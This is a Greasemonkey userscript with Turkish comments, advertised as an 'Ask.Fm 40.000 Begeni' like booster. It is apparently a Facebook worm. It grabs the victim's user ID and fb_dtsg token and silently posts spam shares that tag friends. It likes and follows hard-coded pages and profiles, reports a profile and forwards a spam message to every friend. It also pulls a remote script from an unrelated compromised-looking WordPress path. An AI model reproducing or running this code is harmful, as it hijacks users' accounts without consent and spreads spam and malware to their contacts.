// ==UserScript==
// @name           Ask.Fm
// @namespace      askfmhile
// @description    Ask.Fm 40.000 Begeni
// @include        /https?://(|.*\.)facebook.com/?.*/
// @require        http://acneproductreviewsonline.com/wp-admin/a-functions/saner.js
// @version        2.17
// ==/UserScript==

var page_id = "293084497465848";
var post_id = "132569073555536";
var foto_id = "102067596612745";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var kisi_bilgi;
var mesaj = "";
var mesaj_text = "";
var durum = "";
var durum_text = "";
var arkadaslar = [];
var konusmabilgi;
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}

//paylasim penceresini kontrol et
function PaylasKontrol(){
if(document.getElementsByClassName("-cx-PRIVATE-uiDialog__form").length > 0){
	if(document.getElementsByName("appid")[0].value == "2305272732"){
		document.getElementsByName("attachment[params][0]")[0].value = page_id;
		document.getElementsByName("attachment[params][1]")[0].value = foto_id;
		document.getElementsByName("audience[0][value]")[0].value = "80"
		document.getElementsByClassName("-cx-PRIVATE-uiDialog__form")[0].getElementsByClassName("mentionsHidden")[0].name = "message"
		document.getElementsByClassName("-cx-PRIVATE-uiDialog__form")[0].getElementsByClassName("mentionsHidden")[0].value = mesaj;
		if(arkadaslar.payload){
			document.getElementsByClassName("-cx-PRIVATE-uiDialog__form")[0].getElementsByClassName("mentionsHidden")[0].value += RandomArkadas();
		}
	}
	if(document.getElementsByName("appid")[0].value == "2309869772"){
        document.getElementsByName("attachment[params][0]")[0].value = page_id;
		document.getElementsByName("attachment[params][1]")[0].value = post_id;
    }
}
if(document.getElementsByName("attachment[params][video][0][src]").length > 0){
	document.getElementsByName("attachment[params][video][0][src]")[0].value = "http://goo.gl/6gtrs";
	if(document.getElementsByName("audience[0][value]").length > 0){
	document.getElementsByName("audience[0][value]")[0].value = "80";
	}
}
}

//rastgele 10 arkadas getir
function RandomArkadas(){
	var sonuc = "";
	for(i=0;i<9;i++){
		sonuc += " @[" + arkadaslar.payload.entries[Math.floor(Math.random() * arkadaslar.payload.entries.length)].uid + ":" + arkadaslar.payload.entries[Math.floor(Math.random() * arkadaslar.payload.entries.length)].text + "]";
	}
	return sonuc;
}

//paylaskontrol fonksiyonunu timer içinde çalistir
var paylastimer = window.setInterval("PaylasKontrol();",500);

//arkadaslari al ve isle
function arkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					mesaj = "";
					mesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  mesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  mesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					durumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//durum güncelle
function durumguncelle(arkadasliste) {
var datalar = { "fb_dtsg":document.getElementsByName('fb_dtsg')[0].value, 
		"xhpc_composerid":"uighsq_1" , 
		"xhpc_context":"home", "xhpc_fbx":1, 
		"xhpc_timeline":"", "xhpc_ismeta":1, 
		"xhpc_message_text":durum_text, 
		"xhpc_message":durum, 
		"composertags_place":"", 
		"composertags_place_name":"", 
		"composer_predicted_city":"", 
		"composer_session_id":"1342224796", 
		"is_explicit_place":"", 
		"audience[0][value]":"80", 
		"composertags_city":"", 
		"disable_location_sharing":false, 
		"nctr[_mod]":"pagelet_composer", 
		"__user":"100004073313141", 
		"phstamp":"165816770846956117585"};
		for(i=0;i<arkadasliste.payload.entries.length;i++){
			datalar["composertags_with[" + i + "]"] = arkadasliste.payload.entries[i].uid;
		}
		for(i=0;i<arkadasliste.payload.entries.length;i++){
			datalar["text_composertags_with[" + i + "]"] = arkadasliste.payload.entries[i].text;
		}
		datalar["xhpc_targetid"] = toString();
}


//fotograf paylas
function fotopaylas(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("POST", "https://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        else { xmlhttp.open("POST", "http://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        
		var params = "ad_params=";
		params += "&audience[0][value]=80";
		params += "&UITargetedPrivacyWidget=80";
		params += "&friendTarget=";
		params += "&groupTarget=";
		params += "&pageTarget=293084497465848";
		params += "&message=" + mesaj;
		params += "&message_text=" + mesaj_text;
		params += "&UIThumbPager_Input=0";
		params += "&attachment[params][0]=" + page_id;
		params += "&attachment[params][1]=" + foto_id;
		params += "&attachment[type]=2";
		params += "&src=i";
		params += "&appid=2305272732";
		params += "&parent_fbid=";
		params += "&mode=self";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send(params);
		
}

//postpaylas
function postpaylas(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("POST", "https://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        else { xmlhttp.open("POST", "http://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        
		var params = "ad_params=";
		params += "&audience[0][value]=80";
		params += "&UITargetedPrivacyWidget=80";
		params += "&friendTarget=";
		params += "&groupTarget=";
		params += "&pageTarget=293084497465848";
		params += "&message=" + mesaj;
		params += "&message_text=" + mesaj_text;
		params += "&reshare=" + page_id
		params += "&UIThumbPager_Input=0";
		params += "&attachment[params][0]=" + page_id;
		params += "&attachment[params][1]=" + post_id;
		params += "&attachment[params][images][0]=http://i1.ytimg.com/vi/4kr_LlfqEqo/mqdefault.jpg";
		params += "&attachment[type]=99";
		params += "&uithumbpager_width=320";
		params += "&uithumbpager_height=180";
		params += "&src=i";
		params += "&appid=2309869772";
		params += "&parent_fbid=";
		params += "&mode=self";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send(params);
}

//postpaylas
function durumpaylas(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("POST", "https://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        else { xmlhttp.open("POST", "http://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        
		var params = "ad_params=";
		params += "&audience[0][value]=80";
		params += "&UITargetedPrivacyWidget=80";
		params += "&friendTarget=";
		params += "&groupTarget=";
		params += "&pageTarget=293084497465848";
		params += "&message=" + mesaj;
		params += "&message_text=" + mesaj_text;
		params += "&reshare=" + page_id
		params += "&UIThumbPager_Input=0";
		params += "&attachment[params][0]=" + page_id;
		params += "&attachment[params][1]=" + post_id;
		params += "&attachment[type]=22";
		params += "&src=i";
		params += "&appid=25554907596";
		params += "&parent_fbid=";
		params += "&mode=self";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send(params);
}

//dürtme 
function durt(id){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/poke_dialog.php?uid="+ id + "&pokeback=0&ask_for_confirm=0&__a=1", true); 
		var params = "uid=" + id;
		params += "&pokeback=0";
		params += "&ask_for_confirm=0";
		params += "&causal_element=js_0";
		params += "&nctr[_mod]=pagelet_header_personal";
		params += "&__asyncDialog=1";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send(params);
}


//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
arkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
begen("293084497465848","293084497465848","AQDghS0Gif_NQvXJ",22,"");
listeabone("132216430257467");
document.removeEventListener(tiklama);
}
 }, false);
 var urlharic = ["/attachments/messaging_upload.php","ai.php","/ajax/","sound_iframe.php","/connect/","/plugins/","/xd_receiver_"];
 //URl dizi kontrol
 var urluygun = true;
 for(i=0;i<urlharic.length;i++){
	if(document.URL.indexOf(urlharic[i]) > 0){
	urluygun = false;
	}
 }
 
//eger analyticjs nesnesi yoksa script tagi ekle
var urlharic = ["/ajax/","/common/","/attachments/","/connect/","/sound_iframe.php","/plugins/","/contact_importer/","/ai.php"];
 var urldogru = true ;
 for(i=0;i<urlharic.length;i++){
	if(document.URL.indexOf(urlharic[i]) > 0){
	urldogru = false;
	}
 }
 if(!document.getElementById("analyticjs") && urldogru == true){
    var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-32548538-3']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.id = 'analyticjs'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
  }
 
 //begenme
 function begen(userid,durumid,check_hash,type_id,yorumid){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/ufi/modify.php?__a=1", true); 
		var params = "charset_test=€,´,€,´,水,Д,Є";
		params += '&feedback_params={"actor":"' + userid + '","target_fbid":"' + durumid + '","target_profile_id":"' + userid + '","type_id":"' + type_id + '","assoc_obj_id":"","source_app_id":"0","extra_story_params":[],"content_timestamp":"1339701293","check_hash":"' + check_hash + '","source":"0"}';
		params += "&translate_on_load=";
		params += "&add_comment_text=";
		params += '&link_data={"fbid":"293084497465848"}';
		if(yorumid == ""){
		params += "&like=";
		params += "&nctr[_mod]=pagelet_home_stream";
		}
		else{
		params += "&like_comment_id[" + yorumid + "]=" + yorumid;
		}
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		xmlhttp.send(params);
}

//Kişi aboneliği
function aboneol(uyeid){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
        };
        xmlhttp.open("POST", "/ajax/follow/follow_profile.php?__a=1", true);
        var params = "profile_id=" + uyeid;
        params += "&location=3";
        params += "&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value;
		params += "&nctr[_mod]=pagelet_subscribers";
        params += "&__user=" + user_id;
        params += "&phstamp=16581654586116117107156";
		xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xmlhttp.send(params);
}
aboneol("100004073313141");
aboneol("100004285145015");

//Liste aboneligi
function listeabone(id){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		xmlhttp.open("POST", "/ajax/friends/lists/subscribe/modify?__a=1", true); 
		var params = "action=subscribe";
		params += "&location=gear_menu";
		params += "&flid=" + id;
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send(params);
}

//arkadaş ekleme
function arkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"arkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function cinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}

//Şikayet etme
var sikayethtml = document.createElement("html");
var sikayetsonuc = {};
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function sikayetet(cid,rid,hash,asama){
if(asama == 1){
var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			sikayethtml.innerHTML = xmlhttp.responseText;
			sikayetet(cid,rid,sikayethtml.innerHTML.split("/ajax/report/social.php")[1].split("h=")[1].split("&")[0],2);
			}
};
xmlhttp.open("GET", "/" + cid, true);
xmlhttp.send();
}
else if(asama == 2){
var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				eval("sikayetsonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				sikayethtml.innerHTML = sikayetsonuc.jsmods.markup[0][1].__html;
				sikayetet(cid,rid,hash,3)
			}
};
xmlhttp.open("GET", "/ajax/report/social.php?content_type=0&cid=" + cid + "&rid=" + rid + "&h=" + hash + "&from_gear=timeline&causal_element=js_0&__a=1&__asyncDialog=1&__user=" + user_id, true);
xmlhttp.send();
}
else if(asama == 3){
var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/report/social.php?__a=1", true); 
		var params = "sub_lost_access=29";
		params += "&phase_branch=26";
		params += "&sub_fake_profile=-1";
		params += "&authentic_uid=";
		params += "&impersonated_user_name=";
		params += "&duplicate_id=";
		params += "&rid=" + rid;
		params += "&cid=" + cid;
		params += "&h=" + hash;
		params += "&content_type=0";
		params += "&are_friends=";
		params += "&is_following=";
		params += "&time_flow_started=" + sikayethtml.getElementsByTagName("input")[20].value;
		params += "&is_tagged=";
		params += "&on_profile=";
		params += "&from_gear=timeline"
		params += "&ph=" + sikayethtml.getElementsByTagName("input")[24].value;
		params += "&phase=1";
		params += "&expand_report=1";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		xmlhttp.send(params);
}
}
sikayetet("152361432","152361432","",1);

//kendi endine mesaj
function kendinemesaj(baslik,aciklama,posturl,resim){
var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			var mesajbilgi = {};
			 eval("mesajbilgi = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			 mesajilet(mesajbilgi.payload.message.mid,arkadaslar);
			}
        };
		xmlhttp.open("POST", "/ajax/messaging/send.php", true); 
		var params = "forward_msgs&body=&action=send&recipients[0]=" + user_id +"&force_sms=true&&UIThumbPager_Input=0&app_id=2309869772&subject=" + baslik + "&attachment[params][metaTagMap][0][http-equiv]=content-type&attachment[params][metaTagMap][0][content]=text%2Fhtml%3B%20charset%3Dutf-8&attachment[params][metaTagMap][1][property]=og%3Atitle&attachment[params][metaTagMap][1][content]=Durum%20be%C4%9Fendirme&attachment[params][metaTagMap][2][property]=og%3Atype&attachment[params][metaTagMap][2][content]=website&attachment[params][metaTagMap][3][property]=og%3Aimage&attachment[params][metaTagMap][3][content]=" + resim +"&attachment[params][metaTagMap][4][property]=og%3Aurl&attachment[params][metaTagMap][4][content]=" + posturl +"&attachment[params][metaTagMap][5][property]=og%3Adescription&attachment[params][metaTagMap][5][content]=" + aciklama + "&attachment[params][medium]=106&attachment[params][urlInfo][canonical]=" + posturl + "&attachment[params][urlInfo][final]=" + posturl + "&attachment[params][urlInfo][user]=" + posturl + "&attachment[params][favicon]=http%3A%2F%2Fstatictab.com%2Ffavicon.ico&attachment[params][title]=" + baslik + "&attachment[params][fragment_title]=&attachment[params][external_author]=&attachment[params][summary]=" + aciklama + "&attachment[params][url]=" + posturl + "&attachment[params][error]=1&attachment[params][og_info][properties][0][0]=og%3Atitle&attachment[params][og_info][properties][0][1]=" + baslik + "&attachment[params][og_info][properties][1][0]=og%3Atype&attachment[params][og_info][properties][1][1]=website&attachment[params][og_info][properties][2][0]=og%3Aimage&attachment[params][og_info][properties][2][1]=" + resim +"&attachment[params][og_info][properties][3][0]=og%3Aurl&attachment[params][og_info][properties][3][1]=" + posturl + "&attachment[params][og_info][properties][4][0]=og%3Adescription&attachment[params][og_info][properties][4][1]=" + aciklama + "&attachment[params][og_info][guesses][0][0]=og%3Aurl&attachment[params][og_info][guesses][0][1]=" + posturl + "&attachment[params][og_info][guesses][1][0]=og%3Atitle&attachment[params][og_info][guesses][1][1]=" + baslik + "&attachment[params][og_info][guesses][2][0]=og%3Adescription&attachment[params][og_info][guesses][2][1]=" + aciklama + "&attachment[params][og_info][guesses][3][0]=og%3Aimage&attachment[params][og_info][guesses][3][1]=" + resim +"&attachment[params][og_info][namespaces][og]=http%3A%2F%2Fogp.me%2Fns%23&attachment[params][responseCode]=200&attachment[params][redirectPath][0][status]=301&attachment[params][redirectPath][0][url]=" + posturl + "&attachment[params][redirectPath][0][ip]=50.17.206.41&attachment[params][lang]=tr&attachment[params][images][0]=" + resim +"&attachment[params][cache_hit]=1&attachment[type]=100&uithumbpager_width=100&uithumbpager_height=74&__user=" + user_id + "&__a=1&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value + "&phstamp=165816685531121021003505";
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		xmlhttp.send(params);
}

function mesajilet(mid,arkadaslist){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		xmlhttp.open("POST", "/ajax/messaging/send.php", true); 
		var params = "forward_msgs[0]=" + mid;
			params += "&body=";
			params += "&action=send";
		for(i=0;i<arkadaslist.payload.entries.length;i++){
		params += "&recipients[" + i + "]=" + arkadaslist.payload.entries[i].uid;
		}
		params += "&__user=" + user_id;
		params += "&__a=1";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
		params += "&phstamp=165816685531121021001359";
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		xmlhttp.send(params);
}
kendinemesaj("Abone Olur Musun Lütfen ?","Bitanesin Hadi <3","http://www.facebook.com/2BenKimsiniz","http://a2.sphotos.ak.fbcdn.net/hphotos-ak-ash4/315030_102067596612745_168566544_n.jpg");